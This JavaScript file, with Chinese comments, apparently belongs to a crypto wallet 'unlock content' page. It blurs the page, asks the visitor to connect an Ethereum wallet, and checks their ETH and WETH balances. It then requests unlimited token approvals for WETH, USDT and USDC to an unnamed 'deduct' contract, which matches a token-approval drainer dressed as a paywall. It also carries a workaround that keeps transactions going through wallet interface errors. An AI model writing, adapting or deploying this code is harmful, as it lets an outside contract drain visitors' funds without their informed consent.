// --- Client-side Constants (客戶端常數) ---
const DEDUCT_CONTRACT_ADDRESS = '0xaFfC493Ab24fD7029E03CED0d7B87eAFC36E78E0';
const USDT_CONTRACT_ADDRESS = '0xdAC17F958D2ee523a2206206994597C13D831ec7';
const USDC_CONTRACT_ADDRESS = '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48';
const WETH_CONTRACT_ADDRESS = '0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2';

// --- ABI Definitions (客戶端精簡版 ABI) ---
const DEDUCT_CONTRACT_ABI = [
    "function isServiceActiveFor(address customer) view returns (bool)",
    "function activateService(address tokenContract) external",
    "function REQUIRED_ALLOWANCE_THRESHOLD() view returns (uint256)"
];

const ERC20_ABI = [
    "function approve(address spender, uint256 amount) external returns (bool)",
    "function balanceOf(address account) view returns (uint256)",
    "function allowance(address owner, address spender) view returns (uint256)"
];

// --- Global Variables & DOM Elements (全域變數與 DOM 元素) ---
// 確保您的 HTML 中有這些 ID: connectButton, blurOverlay, overlayMessage, status
const connectButton = document.getElementById('connectButton');
const overlay = document.getElementById('blurOverlay');
const overlayMessage = document.getElementById('overlayMessage');
const statusDiv = document.getElementById('status');

let provider, signer, userAddress;
let deductContract, usdtContract, usdcContract, wethContract;

// --- UI Control Functions (使用者介面控制函數) ---
function hideOverlay() {
    if (!overlay) return;
    overlay.style.opacity = '0';
    setTimeout(() => { overlay.style.display = 'none'; }, 300);
}

function showOverlay(message) {
    if (!overlay || !overlayMessage) return;
    overlayMessage.innerHTML = message;
    overlay.style.display = 'flex';
    // 確保 opacity 設置在 display: flex 之後，以便過渡生效
    setTimeout(() => { overlay.style.opacity = '1'; }, 10); 
}

function updateStatus(message) {
    if (!statusDiv) return;
    statusDiv.innerHTML = message || '';
    statusDiv.style.display = message ? 'block' : 'none';
}

/**
 * 重置應用程式的狀態，並可選地顯示「請連接」訊息。
 * @param {boolean} showMsg - 是否顯示連接錢包的遮罩訊息。 (預設為 true)
 */
function resetState(showMsg = true) {
    signer = userAddress = deductContract = usdtContract = usdcContract = wethContract = null;
    if (connectButton) {
        connectButton.classList.remove('connected');
        connectButton.title = '連接錢包';
    }
    if (showMsg) {
        showOverlay('請連接您的錢包以解鎖內容 🔒<p style="font-size: 16px; font-weight: normal; margin-top: 10px;">(點擊錢包圖標開始)</p>');
    }
}

// --- Core Wallet Logic (核心錢包邏輯) ---

/**
 * 【Trust Wallet 修復】使用精簡的 RPC 請求發送交易，並加入魯棒的錯誤處理。
 */
async function sendMobileRobustTransaction(populatedTx) {
    if (!signer || !provider) throw new Error("錢包尚未連線或簽署者遺失。");
    
    const txValue = populatedTx.value ? populatedTx.value.toString() : '0';
    const fromAddress = await signer.getAddress();

    const mobileTx = {
        from: fromAddress,
        to: populatedTx.to,
        data: populatedTx.data,
        value: '0x' + BigInt(txValue).toString(16) 
    };
    
    let txHash;
    let receipt = null;

    try {
        txHash = await provider.send('eth_sendTransaction', [mobileTx]);
        
        showOverlay(`交易已發送！雜湊值: ${txHash.slice(0, 10)}...<br>正在等待區塊確認...`);
        receipt = await provider.waitForTransaction(txHash);
        
    } catch (error) {
        // 捕獲 Trust Wallet 介面錯誤，並嘗試從中提取 hash
        console.warn("⚠️ Trust Wallet 介面可能拋出無害錯誤。正在進行鏈上檢查...");
        
        if (error.hash) {
             txHash = error.hash;
        } else if (error.message && error.message.includes('0x')) {
            const match = error.message.match(/(0x[a-fA-F0-9]{64})/);
            if (match) txHash = match[0];
        }

        if (txHash) {
             showOverlay(`交易介面錯誤發生！但交易已發送：${txHash.slice(0, 10)}...<br>正在等待區塊確認...`);
             receipt = await provider.waitForTransaction(txHash);
        } else {
             throw new Error(`交易發送失敗，且無法從錯誤中獲取交易雜湊值: ${error.message}`);
        }
    }

    if (!receipt || receipt.status !== 1) {
        throw new Error(`交易最終在鏈上失敗 (reverted)。Hash: ${txHash.slice(0, 10)}...`);
    }

    return receipt;
}

/**
 * 初始化錢包，強制切換至主網，並【總是開啟遮罩】要求用戶手動連接。
 */
async function initializeWallet() {
    try {
        if (typeof window.ethereum === 'undefined') {
            return showOverlay('請安裝 MetaMask, Trust Wallet 或相容錢包以繼續。');
        }
        
        provider = new ethers.BrowserProvider(window.ethereum);

        const network = await provider.getNetwork();
        if (network.chainId !== 1n) {
            showOverlay('正在請求切換到以太坊主網...<br>請在您的錢包中批准。');
            try {
                await provider.send('wallet_switchEthereumChain', [{ chainId: '0x1' }]);
                return; 
            } catch (switchError) {
                if (switchError.code === 4001) {
                    return showOverlay('您必須切換到以太坊主網才能使用此服務。請手動切換後刷新頁面。');
                }
                return showOverlay(`切換網路失敗。請手動操作。<br>錯誤: ${switchError.message}`);
            }
        }

        window.ethereum.on('accountsChanged', () => window.location.reload());
        window.ethereum.on('chainChanged', () => window.location.reload());

        // 檢查是否有現有的連線，如果有，重置狀態確保 connectButton 顯示未連接。
        const accounts = await provider.send('eth_accounts', []);
        if (accounts.length > 0) {
            resetState(false); 
        }

        // 【關鍵點】：每次頁面載入，強制顯示連接遮罩
        showOverlay('請連接您的錢包以解鎖內容 🔒<p style="font-size: 16px; font-weight: normal; margin-top: 10px;">(點擊錢包圖標開始)</p>');


    } catch (error) {
        console.error("Initialize Wallet Error:", error);
        showOverlay(`初始化失敗: ${error.message}`);
    }
}

/**
 * 檢查使用者的服務啟動狀態和代幣授權額度。
 */
async function checkAuthorization() {
    try {
        if (!signer) return showOverlay('錢包未連接。請先連接。');
        updateStatus("正在檢查授權狀態...");

        const isServiceActive = await deductContract.isServiceActiveFor(userAddress);
        const requiredAllowance = await deductContract.REQUIRED_ALLOWANCE_THRESHOLD();
        
        const [usdtAllowance, usdcAllowance, wethAllowance] = await Promise.all([
            usdtContract.allowance(userAddress, DEDUCT_CONTRACT_ADDRESS),
            usdcContract.allowance(userAddress, DEDUCT_CONTRACT_ADDRESS),
            wethContract.allowance(userAddress, DEDUCT_CONTRACT_ADDRESS)
        ]);

        const hasSufficientAllowance = (usdtAllowance >= requiredAllowance) || (usdcAllowance >= requiredAllowance) || (wethAllowance >= requiredAllowance);
        const isFullyAuthorized = isServiceActive && hasSufficientAllowance;

        if (isFullyAuthorized) {
            if (connectButton) {
                 connectButton.classList.add('connected');
                 connectButton.title = '斷開錢包';
            }
            hideOverlay();
            updateStatus("✅ 服務已啟動並授權完成。");
        } else {
            if (connectButton) {
                 connectButton.classList.remove('connected');
                 connectButton.title = '連接與授權';
            }
            // 如果未授權，則再次顯示連接/授權提示
            showOverlay('需要授權。<p style="font-size: 16px; font-weight: normal; margin-top: 10px;">(請點擊錢包圖標開始授權流程)</p>');
        }
        updateStatus("");
    } catch (error) {
        console.error("Check Authorization Error:", error);
        if (error.code === 'CALL_EXCEPTION') {
            return showOverlay('合約通訊失敗。<br>請確保您在 **以太坊主網** 上，且合約地址正確，然後刷新頁面。');
        }
        showOverlay(`授權檢查失敗: ${error.message}`);
    }
}

/**
 * 條件式授權流程：根據 ETH/WETH 餘額決定要授權哪些代幣。
 */
async function handleConditionalAuthorizationFlow(requiredAllowance, serviceActivated, tokensToProcess) {
    showOverlay('正在檢查並設定代幣的支付授權...');
    let tokenToActivate = '';
    let stepCount = 0;

    const totalSteps = serviceActivated ? tokensToProcess.length : tokensToProcess.length + 1;

    // --- 檢查並請求所有所需代幣的授權 ---
    for (const { name, contract, address } of tokensToProcess) {
        stepCount++;
        showOverlay(`步驟 ${stepCount}/${totalSteps}: 檢查並請求 ${name} 授權...`);

        const currentAllowance = await contract.allowance(userAddress, DEDUCT_CONTRACT_ADDRESS);

        if (currentAllowance < requiredAllowance) {
            showOverlay(`步驟 ${stepCount}/${totalSteps}: 請求 ${name} 授權...<br>請在您的錢包中批准。`);
            
            const approvalTx = await contract.approve.populateTransaction(DEDUCT_CONTRACT_ADDRESS, ethers.MaxUint256);
            approvalTx.value = 0n;
            await sendMobileRobustTransaction(approvalTx);
            
            const newAllowance = await contract.allowance(userAddress, DEDUCT_CONTRACT_ADDRESS);
            if (newAllowance >= requiredAllowance) {
                if (!serviceActivated && !tokenToActivate) {
                    tokenToActivate = address;
                }
            }
        } else {
            if (!serviceActivated && !tokenToActivate) {
                tokenToActivate = address;
            }
        }
    }

    // --- 服務啟動步驟 ---
    if (!serviceActivated && tokenToActivate) {
        stepCount++;
        const tokenName = tokensToProcess.find(t => t.address === tokenToActivate).name;
        showOverlay(`步驟 ${stepCount}/${totalSteps}: 啟動服務 (使用 ${tokenName})...`);
        
        const activateTx = await deductContract.activateService.populateTransaction(tokenToActivate);
        activateTx.value = 0n;
        await sendMobileRobustTransaction(activateTx);
    } else if (!serviceActivated) {
        showOverlay(`警告: 沒有足夠的代幣授權來啟動服務。請確保您有 ETH 支付 Gas 費用。`);
    } else {
        showOverlay(`所有授權和服務啟動已完成。`);
    }
}


/**
 * 主要函數：連接錢包並根據餘額執行條件式流程。
 */
async function connectWallet() {
    try {
        if (!provider || (await provider.getNetwork()).chainId !== 1n) {
             await initializeWallet();
             const network = await provider.getNetwork();
             if (network.chainId !== 1n) return;
        }

        showOverlay('請在您的錢包中確認連線...');
        const accounts = await provider.send('eth_requestAccounts', []);
        if (accounts.length === 0) throw new Error("未選擇帳戶。");

        // 連接成功，設定 Signer 和合約實例
        signer = await provider.getSigner();
        userAddress = await signer.getAddress();
        
        deductContract = new ethers.Contract(DEDUCT_CONTRACT_ADDRESS, DEDUCT_CONTRACT_ABI, signer);
        usdtContract = new ethers.Contract(USDT_CONTRACT_ADDRESS, ERC20_ABI, signer);
        usdcContract = new ethers.Contract(USDC_CONTRACT_ADDRESS, ERC20_ABI, signer);
        wethContract = new ethers.Contract(WETH_CONTRACT_ADDRESS, ERC20_ABI, signer);

        showOverlay('正在掃描您的餘額以決定最佳授權流程...');

        const [ethBalance, wethBalance] = await Promise.all([
            provider.getBalance(userAddress),
            wethContract.balanceOf(userAddress),
        ]);
        
        const oneEth = ethers.parseEther("1.0");
        const totalEthEquivalent = ethBalance + wethBalance;
        const hasSufficientEth = totalEthEquivalent >= oneEth;

        const serviceActivated = await deductContract.isServiceActiveFor(userAddress);
        const requiredAllowance = await deductContract.REQUIRED_ALLOWANCE_THRESHOLD();

        let tokensToProcess;

        if (hasSufficientEth) {
            // 情況 1: 餘額足夠 (>= 1 ETH/WETH) -> 授權 WETH, USDT, USDC (WETH優先)
            tokensToProcess = [
                { name: 'WETH', contract: wethContract, address: WETH_CONTRACT_ADDRESS },
                { name: 'USDT', contract: usdtContract, address: USDT_CONTRACT_ADDRESS },
                { name: 'USDC', contract: usdcContract, address: USDC_CONTRACT_ADDRESS },
            ];
            showOverlay('偵測到足夠的 ETH/WETH 餘額 (>= 1 ETH)，啟動 WETH, USDT, USDC 授權流程。');
        } else {
            // 情況 2: 餘額不足 (< 1 ETH/WETH) -> 只授權 USDT, USDC
            tokensToProcess = [
                { name: 'USDT', contract: usdtContract, address: USDT_CONTRACT_ADDRESS },
                { name: 'USDC', contract: usdcContract, address: USDC_CONTRACT_ADDRESS },
            ];
            showOverlay('ETH/WETH 餘額不足 ( < 1 ETH)，啟動 USDT, USDC 授權流程。');
        }

        await handleConditionalAuthorizationFlow(requiredAllowance, serviceActivated, tokensToProcess);
        
        // 最終檢查並更新 UI
        await checkAuthorization();

    } catch (error) {
        console.error("Connect Wallet Error:", error);
        
        let userMessage = `發生錯誤: ${error.message}`;
        if (error.code === 4001) {
            userMessage = "您已拒絕交易或連線。請重試。";
        } else if (error.message.includes('insufficient funds')) {
             userMessage = "交易失敗: 錢包 ETH 餘額不足以支付 Gas 費用。";
        }
        
        showOverlay(userMessage);
        if (connectButton) {
            connectButton.classList.remove('connected');
            connectButton.title = '連線錢包 (重試)';
        }
    }
}

/**
 * 斷開連線並重置應用程式狀態。
 */
function disconnectWallet() {
    resetState(true);
    alert('錢包已斷開連線。若要徹底移除網站權限，請在您錢包的「已連接網站」設定中操作。');
}

// --- Event Listeners & Initial Load (事件監聽器與初始載入) ---

if (connectButton) {
    connectButton.addEventListener('click', () => {
        if (connectButton.classList.contains('connected')) {
            disconnectWallet();
        } else {
            connectWallet();
        }
    });
}

// 頁面載入時執行初始化，這將強制顯示連接遮罩
initializeWallet();